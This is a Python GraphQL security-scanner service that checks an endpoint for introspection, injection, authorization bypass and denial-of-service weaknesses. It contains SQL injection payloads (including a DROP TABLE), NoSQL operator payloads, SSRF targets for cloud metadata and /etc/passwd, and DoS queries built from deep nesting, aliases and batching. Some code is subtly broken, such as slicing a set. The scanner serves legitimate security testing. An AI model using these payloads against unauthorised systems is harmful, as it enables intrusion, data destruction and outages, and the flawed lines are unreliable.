"""
GraphQL Security Service

Comprehensive service for testing GraphQL API security including:
- Introspection detection
- Query complexity attacks (depth, width, batching, aliases)
- Authorization bypass (BOLA, BFLA)
- Injection attacks (SQL, NoSQL, SSRF via fields)
- Information disclosure
- Subscription abuse
- Directive injection
- Field suggestion enumeration
"""

import sys
from pathlib import Path as PathLib
sys.path.insert(0, str(PathLib(__file__).parent.parent.parent))

import uuid
import re
import asyncio
from typing import Any, List, Dict, Optional, Tuple
from dataclasses import dataclass, field

from ...proto import (
    APISecurityFinding,
    GraphQLIntrospectionResult,
    GraphQLDoSResult,
    TestCategory,
    TestSubCategory,
    SeverityLevel,
    ConfidenceLevel,
    OWASPCategory,
)
from ..databases.api_security_databases import GRAPHQL_INTROSPECTION_QUERY, GRAPHQL_DEEP_QUERY_TEMPLATE


@dataclass
class GraphQLInjectionResult:
    """Result of GraphQL injection test."""
    test_id: str
    injection_type: str  # sqli, nosql, ssrf, directive
    vulnerable: bool
    payload: str
    field: Optional[str] = None
    evidence: Optional[str] = None


@dataclass
class GraphQLAuthzResult:
    """Result of GraphQL authorization test."""
    test_id: str
    test_type: str  # bola, bfla, idor
    vulnerable: bool
    endpoint: str
    field_or_mutation: Optional[str] = None
    evidence: Optional[str] = None


# Introspection Query
INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
        }
      }
    }
  }
}
"""

# Field suggestion query (for enumeration without introspection)
FIELD_SUGGESTION_QUERY_TEMPLATE = """
query {{ 
  {field_name} 
}}
"""

# SQL Injection payloads for GraphQL
GRAPHQL_SQLI_PAYLOADS = [
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "1' AND SLEEP(5) --",
    "1\" OR \"1\"=\"1",
]

# NoSQL Injection payloads for GraphQL
GRAPHQL_NOSQL_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    '{"$where": "this.password.length > 0"}',
    '{"password": {"$ne": ""}}',
]

# SSRF payloads for GraphQL fields
GRAPHQL_SSRF_PAYLOADS = [
    "http://localhost:8080",
    "http://127.0.0.1:22",
    "http://169.254.169.254/latest/meta-data/",
    "file:///etc/passwd",
]

# Directive injection payloads
GRAPHQL_DIRECTIVE_PAYLOADS = [
    '@skip(if: true)',
    '@include(if: false)',
    '@deprecated(reason: "test")',
    '@custom_directive',
]

# Denial of Service query patterns
GRAPHQL_DOS_PATTERNS = {
    "depth": """
query DeepQuery {
  {nested_query}
}
""",
    "width": """
query WideQuery {
  {field_aliases}
}
""",
    "batch": """
[{queries}]
""",
    "circular_fragment": """
query CircularFragment {
  ...FragA
}
fragment FragA on Query {
  ...FragB
}
fragment FragB on Query {
  ...FragA
}
""",
}


class GraphQLSecurityService:
    """Comprehensive service for testing GraphQL API security."""
    
    def __init__(self, plugin_instance: Any, http_client: Any = None):
        self.plugin = plugin_instance
        self.http_client = http_client
        self.findings: List[APISecurityFinding] = []
        self._schema_cache: Dict[str, Any] = {}
    
    async def _send_graphql_request(
        self,
        endpoint: str,
        query: str,
        variables: Dict[str, Any] = None,
        operation_name: str = None,
        timeout: float = 10.0,
    ) -> Tuple[Optional[Dict], int]:
        """Send GraphQL request and return response."""
        if self.http_client is None:
            return (None, 200)
        
        try:
            payload = {"query": query}
            if variables:
                payload["variables"] = variables
            if operation_name:
                payload["operationName"] = operation_name
            
            response = await self.http_client.post(
                endpoint,
                json=payload,
                headers={"Content-Type": "application/json"},
                timeout=timeout,
            )
            
            data = await response.json() if hasattr(response, 'json') else None
            return (data, response.status if hasattr(response, 'status') else 200)
        except Exception as e:
            return ({"error": str(e)}, 500)
    
    async def test_introspection(
        self,
        endpoint_url: str,
    ) -> GraphQLIntrospectionResult:
        """
        Test if introspection is enabled.
        
        Introspection exposes the full API schema including:
        - All types, fields, and arguments
        - Queries, mutations, subscriptions
        - Deprecated fields
        """
        result = GraphQLIntrospectionResult(
            introspection_enabled=False,
            types_count=0,
            queries_count=0,
            mutations_count=0,
        )
        
        # Test full introspection - use imported query from database
        introspection_query = GRAPHQL_INTROSPECTION_QUERY if GRAPHQL_INTROSPECTION_QUERY else INTROSPECTION_QUERY
        data, status = await self._send_graphql_request(endpoint_url, introspection_query)
        
        if data and "data" in data and "__schema" in data.get("data", {}):
            schema = data["data"]["__schema"]
            result.introspection_enabled = True
            result.types_count = len(schema.get("types", []))
            
            # Count queries
            query_type_name = schema.get("queryType", {}).get("name")
            mutation_type_name = schema.get("mutationType", {}).get("name")
            
            for type_info in schema.get("types", []):
                if type_info.get("name") == query_type_name:
                    result.queries_count = len(type_info.get("fields", []))
                if type_info.get("name") == mutation_type_name:
                    result.mutations_count = len(type_info.get("fields", []))
            
            # Cache schema for further analysis
            self._schema_cache[endpoint_url] = schema
            
            # Create finding
            sensitive_types = self._find_sensitive_types(schema)
            description = f"GraphQL introspection is enabled, exposing the full API schema. Found {result.types_count} types, {result.queries_count} queries, {result.mutations_count} mutations."
            if sensitive_types:
                description += f" Sensitive types detected: {', '.join(sensitive_types[:5])}"
            
            self.findings.append(APISecurityFinding(
                id=str(uuid.uuid4()),
                category=TestCategory.GRAPHQL,
                sub_category=TestSubCategory.GRAPHQL_INTROSPECTION,
                severity=SeverityLevel.MEDIUM,
                confidence=ConfidenceLevel.CONFIRMED,
                owasp=OWASPCategory.API8_SECURITY_MISCONFIG,
                title="GraphQL Introspection Enabled",
                description=description,
                endpoint=endpoint_url,
                risk_score=5.0,
                recommendation="Disable introspection in production environments using graphql-disable-introspection or similar",
                remediation_steps=[
                    "Disable introspection queries in production",
                    "Use allowlisting for permitted queries",
                    "Implement query complexity analysis",
                    "Monitor for introspection attempts",
                ],
            ))
        
        return result
    
    async def test_field_suggestions(
        self,
        endpoint_url: str,
    ) -> List[str]:
        """
        Test for field suggestion enumeration.
        
        Even with introspection disabled, field suggestions in error messages
        can reveal the schema.
        """
        discovered_fields = []
        common_fields = [
            "user", "users", "admin", "password", "email", "token",
            "secret", "key", "config", "settings", "debug", "internal",
            "private", "auth", "login", "account", "profile", "order",
            "payment", "transaction", "customer", "product", "inventory",
        ]
        
        for field_name in common_fields:
            query = FIELD_SUGGESTION_QUERY_TEMPLATE.format(field_name=field_name + "xyz")
            data, status = await self._send_graphql_request(endpoint_url, query)
            
            if data and "errors" in data:
                error_msg = str(data["errors"])
                # Look for suggestions like "Did you mean 'user'?"
                if "Did you mean" in error_msg or "did you mean" in error_msg.lower():
                    suggestions = re.findall(r"'(\w+)'", error_msg)
                    discovered_fields.extend(suggestions)
        
        if discovered_fields:
            self.findings.append(APISecurityFinding(
                id=str(uuid.uuid4()),
                category=TestCategory.GRAPHQL,
                sub_category=TestSubCategory.GRAPHQL_INTROSPECTION,
                severity=SeverityLevel.LOW,
                confidence=ConfidenceLevel.HIGH,
                owasp=OWASPCategory.API3_EXCESSIVE_DATA,
                title="GraphQL Field Suggestion Enabled",
                description=f"Field suggestions reveal schema information: {', '.join(set(discovered_fields)[:10])}",
                endpoint=endpoint_url,
                risk_score=3.0,
                recommendation="Disable field suggestions in production or use generic error messages",
            ))
        
        return list(set(discovered_fields))
    
    async def test_depth_limit(
        self,
        endpoint_url: str,
        max_depth: int = 20,
    ) -> GraphQLDoSResult:
        """
        Test for query depth limiting.
        
        Deep nested queries can cause exponential resource consumption.
        """
        result = GraphQLDoSResult(
            test_type="depth_limit",
            query_depth=0,
            vulnerable=False,
        )
        
        # Build progressively deeper queries using GRAPHQL_DEEP_QUERY_TEMPLATE if available
        for depth in range(5, max_depth + 1, 5):
            if GRAPHQL_DEEP_QUERY_TEMPLATE:
                # Use template from database
                nested = "id"
                for _ in range(depth):
                    nested = GRAPHQL_DEEP_QUERY_TEMPLATE.format(inner=nested) if "{inner}" in GRAPHQL_DEEP_QUERY_TEMPLATE else f"user {{ friends {{ {nested} }} }}"
                query = f"query {{ {nested} }}"
            else:
                nested = "id"
                for _ in range(depth):
                    nested = f"user {{ friends {{ {nested} }} }}"
                query = f"query {{ {nested} }}"
            data, status = await self._send_graphql_request(endpoint_url, query, timeout=30.0)
            
            # Check if query succeeded (no depth limit error)
            if data and "errors" not in data:
                result.query_depth = depth
                result.vulnerable = True
            elif data and "errors" in data:
                error_msg = str(data["errors"]).lower()
                if "depth" in error_msg or "complexity" in error_msg:
                    # Depth limiting is in place
                    break
        
        if result.vulnerable and result.query_depth >= 10:
            self.findings.append(APISecurityFinding(
                id=str(uuid.uuid4()),
                category=TestCategory.GRAPHQL,
                sub_category=TestSubCategory.GRAPHQL_DOS,
                severity=SeverityLevel.HIGH,
                confidence=ConfidenceLevel.HIGH,
                owasp=OWASPCategory.API4_UNRESTRICTED_RESOURCE,
                title="GraphQL Query Depth Not Limited",
                description=f"GraphQL endpoint accepts queries with depth {result.query_depth}. This can lead to DoS.",
                endpoint=endpoint_url,
                risk_score=7.5,
                recommendation="Implement query depth limiting (recommended max: 10)",
                remediation_steps=[
                    "Implement query depth analysis",
                    "Set maximum depth limit (e.g., 10)",
                    "Use libraries like graphql-depth-limit",
                    "Monitor for deep query attempts",
                ],
            ))
        
        return result
    
    async def test_batching_attack(
        self,
        endpoint_url: str,
        batch_size: int = 100,
    ) -> GraphQLDoSResult:
        """
        Test for query batching attacks.
        
        Batching allows sending multiple queries in one request,
        bypassing rate limiting.
        """
        result = GraphQLDoSResult(
            test_type="batching",
            batch_size=0,
            vulnerable=False,
        )
        
        # Test batch query
        queries = [{"query": "query { __typename }"} for _ in range(batch_size)]
        
        try:
            if self.http_client:
                response = await self.http_client.post(
                    endpoint_url,
                    json=queries,
                    headers={"Content-Type": "application/json"},
                    timeout=30.0,
                )
                
                data = await response.json() if hasattr(response, 'json') else None
                
                # Check if all queries were executed
                if isinstance(data, list) and len(data) == batch_size:
                    result.batch_size = batch_size
                    result.vulnerable = True
        except Exception:
            pass
        
        if result.vulnerable:
            self.findings.append(APISecurityFinding(
                id=str(uuid.uuid4()),
                category=TestCategory.GRAPHQL,
                sub_category=TestSubCategory.GRAPHQL_DOS,
                severity=SeverityLevel.HIGH,
                confidence=ConfidenceLevel.HIGH,
                owasp=OWASPCategory.API4_UNRESTRICTED_RESOURCE,
                title="GraphQL Query Batching Not Limited",
                description=f"GraphQL endpoint accepts batch of {result.batch_size} queries, bypassing rate limiting",
                endpoint=endpoint_url,
                risk_score=7.0,
                recommendation="Limit or disable query batching, implement per-batch rate limiting",
            ))
        
        return result
    
    async def test_alias_overload(
        self,
        endpoint_url: str,
        alias_count: int = 1000,
    ) -> GraphQLDoSResult:
        """
        Test for alias overload DoS.
        
        Field aliases allow duplicating expensive operations in a single query.
        """
        result = GraphQLDoSResult(
            test_type="alias_overload",
            alias_count=0,
            vulnerable=False,
        )
        
        # Build query with many aliases
        aliases = " ".join([f"alias{i}: __typename" for i in range(alias_count)])
        query = f"query {{ {aliases} }}"
        
        data, status = await self._send_graphql_request(endpoint_url, query, timeout=30.0)
        
        if data and "errors" not in data and "data" in data:
            # Check if all aliases were resolved
            if len(data.get("data", {})) >= alias_count * 0.9:  # Allow some tolerance
                result.alias_count = alias_count
                result.vulnerable = True
        
        if result.vulnerable:
            self.findings.append(APISecurityFinding(
                id=str(uuid.uuid4()),
                category=TestCategory.GRAPHQL,
                sub_category=TestSubCategory.GRAPHQL_DOS,
                severity=SeverityLevel.MEDIUM,
                confidence=ConfidenceLevel.HIGH,
                owasp=OWASPCategory.API4_UNRESTRICTED_RESOURCE,
                title="GraphQL Alias Overload Possible",
                description=f"GraphQL endpoint accepts {result.alias_count} field aliases in single query",
                endpoint=endpoint_url,
                risk_score=6.0,
                recommendation="Implement query complexity limits including alias counting",
            ))
        
        return result

    async def test_injection(
        self,
        endpoint_url: str,
        target_field: str = "user",
        target_arg: str = "id",
    ) -> List[GraphQLInjectionResult]:
        """
        Test for injection vulnerabilities in GraphQL arguments.
        """
        results = []
        
        # SQL Injection
        for payload in GRAPHQL_SQLI_PAYLOADS:
            query = f'query {{ {target_field}({target_arg}: "{payload}") {{ id }} }}'
            data, status = await self._send_graphql_request(endpoint_url, query)
            
            result = GraphQLInjectionResult(
                test_id=str(uuid.uuid4()),
                injection_type="sqli",
                vulnerable=False,
                payload=payload,
                field=target_field,
            )
            
            if data:
                error_msg = str(data.get("errors", "")).lower()
                if any(indicator in error_msg for indicator in ["syntax", "mysql", "postgresql", "sql", "ora-"]):
                    result.vulnerable = True
                    result.evidence = error_msg[:200]
                    
                    self.findings.append(APISecurityFinding(
                        id=str(uuid.uuid4()),
                        category=TestCategory.GRAPHQL,
                        sub_category=TestSubCategory.GRAPHQL_INJECTION,
                        severity=SeverityLevel.CRITICAL,
                        confidence=ConfidenceLevel.HIGH,
                        owasp=OWASPCategory.API1_BOLA,
                        title="GraphQL SQL Injection",
                        description=f"SQL injection possible via GraphQL field {target_field}",
                        endpoint=endpoint_url,
                        risk_score=9.0,
                        recommendation="Use parameterized queries, validate input",
                    ))
            
            results.append(result)
            if result.vulnerable:
                break
        
        # NoSQL Injection
        for payload in GRAPHQL_NOSQL_PAYLOADS:
            query = f'query {{ {target_field}({target_arg}: {payload}) {{ id }} }}'
            data, status = await self._send_graphql_request(endpoint_url, query)
            
            result = GraphQLInjectionResult(
                test_id=str(uuid.uuid4()),
                injection_type="nosql",
                vulnerable=False,
                payload=payload,
                field=target_field,
            )
            
            if data and "data" in data and data["data"]:
                # NoSQL injection might return unexpected data
                result.vulnerable = True
                result.evidence = "Query returned data with injection payload"
                
                self.findings.append(APISecurityFinding(
                    id=str(uuid.uuid4()),
                    category=TestCategory.GRAPHQL,
                    sub_category=TestSubCategory.GRAPHQL_INJECTION,
                    severity=SeverityLevel.CRITICAL,
                    confidence=ConfidenceLevel.MEDIUM,
                    owasp=OWASPCategory.API1_BOLA,
                    title="GraphQL NoSQL Injection",
                    description=f"NoSQL injection possible via GraphQL field {target_field}",
                    endpoint=endpoint_url,
                    risk_score=8.5,
                    recommendation="Validate and sanitize all GraphQL arguments",
                ))
            
            results.append(result)
            if result.vulnerable:
                break
        
        return results
    
    async def test_authorization_bypass(
        self,
        endpoint_url: str,
        object_ids: List[str] = None,
    ) -> List[GraphQLAuthzResult]:
        """
        Test for authorization bypass (BOLA/IDOR) in GraphQL.
        """
        results = []
        test_ids = object_ids or ["1", "2", "admin", "0", "-1", "999999"]
        
        for obj_id in test_ids:
            # Test direct object access
            query = f'query {{ user(id: "{obj_id}") {{ id email role }} }}'
            data, status = await self._send_graphql_request(endpoint_url, query)
            
            result = GraphQLAuthzResult(
                test_id=str(uuid.uuid4()),
                test_type="bola",
                vulnerable=False,
                endpoint=endpoint_url,
                field_or_mutation=f"user(id: {obj_id})",
            )
            
            if data and "data" in data and data["data"].get("user"):
                user_data = data["data"]["user"]
                # Check if sensitive data is exposed
                if any(field in user_data for field in ["email", "password", "role", "token"]):
                    result.vulnerable = True
                    result.evidence = f"Accessed user {obj_id} data: {list(user_data.keys())}"
            
            results.append(result)
        
        # Check for vulnerable access patterns
        vulnerable_count = sum(1 for r in results if r.vulnerable)
        if vulnerable_count > 1:
            self.findings.append(APISecurityFinding(
                id=str(uuid.uuid4()),
                category=TestCategory.GRAPHQL,
                sub_category=TestSubCategory.GRAPHQL_AUTHORIZATION,
                severity=SeverityLevel.HIGH,
                confidence=ConfidenceLevel.HIGH,
                owasp=OWASPCategory.API1_BOLA,
                title="GraphQL BOLA/IDOR Vulnerability",
                description=f"Broken object level authorization: accessed {vulnerable_count} user objects",
                endpoint=endpoint_url,
                risk_score=8.0,
                recommendation="Implement proper authorization checks at resolver level",
            ))
        
        return results
    
    async def test_subscription_abuse(
        self,
        endpoint_url: str,
    ) -> Dict[str, Any]:
        """
        Test for GraphQL subscription abuse.
        """
        result = {
            "subscriptions_enabled": False,
            "vulnerable": False,
            "findings": [],
        }
        
        # Check if subscriptions are exposed in schema
        if endpoint_url in self._schema_cache:
            schema = self._schema_cache[endpoint_url]
            if schema.get("subscriptionType"):
                result["subscriptions_enabled"] = True
                
                # Look for sensitive subscriptions
                for type_info in schema.get("types", []):
                    if type_info.get("name") == schema["subscriptionType"].get("name"):
                        subscriptions = [f.get("name") for f in type_info.get("fields", [])]
                        
                        sensitive = ["userCreated", "orderCreated", "paymentReceived", 
                                    "messageReceived", "newNotification", "adminEvent"]
                        exposed_sensitive = [s for s in subscriptions if any(sens in s.lower() for sens in sensitive)]
                        
                        if exposed_sensitive:
                            result["vulnerable"] = True
                            result["findings"] = exposed_sensitive
                            
                            self.findings.append(APISecurityFinding(
                                id=str(uuid.uuid4()),
                                category=TestCategory.GRAPHQL,
                                sub_category=TestSubCategory.GRAPHQL_AUTHORIZATION,
                                severity=SeverityLevel.MEDIUM,
                                confidence=ConfidenceLevel.MEDIUM,
                                owasp=OWASPCategory.API5_BROKEN_FUNCTION_AUTH,
                                title="Sensitive GraphQL Subscriptions Exposed",
                                description=f"Potentially sensitive subscriptions: {', '.join(exposed_sensitive)}",
                                endpoint=endpoint_url,
                                risk_score=6.0,
                                recommendation="Implement authorization for all subscriptions",
                            ))
        
        return result
    
    def _find_sensitive_types(self, schema: Dict) -> List[str]:
        """Find potentially sensitive types in schema."""
        sensitive_keywords = [
            "password", "secret", "token", "key", "auth", "admin",
            "private", "internal", "config", "credential", "session",
        ]
        
        sensitive_types = []
        for type_info in schema.get("types", []):
            name = type_info.get("name", "").lower()
            if any(keyword in name for keyword in sensitive_keywords):
                sensitive_types.append(type_info.get("name"))
            
            # Check fields
            for field in type_info.get("fields", []) or []:
                field_name = field.get("name", "").lower()
                if any(keyword in field_name for keyword in sensitive_keywords):
                    sensitive_types.append(f"{type_info.get('name')}.{field.get('name')}")
        
        return sensitive_types
    
    async def run_full_scan(
        self,
        endpoint_url: str,
    ) -> Dict[str, Any]:
        """
        Run comprehensive GraphQL security scan.
        """
        results = {
            "introspection": await self.test_introspection(endpoint_url),
            "field_suggestions": await self.test_field_suggestions(endpoint_url),
            "depth_limit": await self.test_depth_limit(endpoint_url),
            "batching": await self.test_batching_attack(endpoint_url),
            "alias_overload": await self.test_alias_overload(endpoint_url),
            "injections": await self.test_injection(endpoint_url),
            "authorization": await self.test_authorization_bypass(endpoint_url),
            "subscriptions": await self.test_subscription_abuse(endpoint_url),
            "findings_count": len(self.findings),
        }
        
        return results
    
    def get_findings(self) -> List[APISecurityFinding]:
        """Get all findings."""
        return self.findings
    
    def clear(self):
        """Clear findings and cache."""
        self.findings.clear()
        self._schema_cache.clear()
